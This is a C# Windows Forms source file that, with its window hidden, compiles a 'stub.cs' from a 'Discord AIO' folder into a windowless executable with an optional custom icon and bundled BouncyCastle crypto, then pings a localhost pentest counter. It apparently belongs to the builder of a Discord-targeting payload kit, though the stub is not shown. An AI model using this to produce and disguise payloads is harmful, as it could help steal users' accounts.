using Microsoft.CodeAnalysis;
using Microsoft.CodeAnalysis.CSharp;
using Microsoft.CSharp;
using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.Globalization;
using System.IO;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Windows.Forms;

namespace aiocompiler
{
    public partial class daioCompiler : Form
    {
        private string _DP { get; set; }

        public daioCompiler(string[] args)
        {
            InitializeComponent();
            Opacity = 0;
            Visible = false;
            _DP = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Discord AIO");
            Compile(args[0], args[1]);
        }

        private async void Compile(string output, string icon)
        {
            try
            {
                string stubPath = Path.Combine(_DP, "stub.cs");
                if (!File.Exists(stubPath))
                {
                    MessageBox.Show("No stub found.");
                    Environment.Exit(0);
                }

                string code = File.ReadAllText(stubPath);
                string compileOptions = "/target:winexe /platform:anycpu /optimize";

                if (icon != "none")
                {
                    compileOptions = compileOptions + " /win32icon:\"" + icon + "\"";
                }

                CodeDomProvider objCodeCompiler = new Microsoft.CodeDom.Providers.DotNetCompilerPlatform.CSharpCodeProvider();

                var parameters = new CompilerParameters()
                {
                    GenerateExecutable = true,
                    GenerateInMemory = false,
                    OutputAssembly = output,
                    CompilerOptions = compileOptions,
                    TreatWarningsAsErrors = false,
                    IncludeDebugInformation = false
                };
                string[] referencedAssemblies = {
                    "System.dll", "System.Net.dll", "System.Windows.Forms.dll",
                    "System.Linq.dll", "System.IO.dll",
                    "System.Collections.dll", "System.Core.dll", "System.Security.dll",
                    "System.Net.Http.dll", "System.Threading.dll", _DP + "\\BouncyCastle.Crypto.dll"
                };

                parameters.ReferencedAssemblies.AddRange(referencedAssemblies);
                parameters.EmbeddedResources.Add(Path.Combine(_DP, "BouncyCastle.Crypto.dll"));

                CompilerResults compResults = objCodeCompiler.CompileAssemblyFromSource(parameters, code);
                if (compResults.Errors.HasErrors)
                {
                    MessageBox.Show(string.Format("The compiler has encountered {0} errors", compResults.Errors.Count), "Errors while compiling", MessageBoxButtons.OK, MessageBoxIcon.Hand);
                }
                else
                {
                    using (HttpClient c = new HttpClient())
                    {
                        var response = await c.PostAsync("https://localhost:7118/statistics/increment-pentests", null);
                    }
                    MessageBox.Show("Compiled.");
                }
                Environment.Exit(0);
            }
            catch {}
        }
    }
}
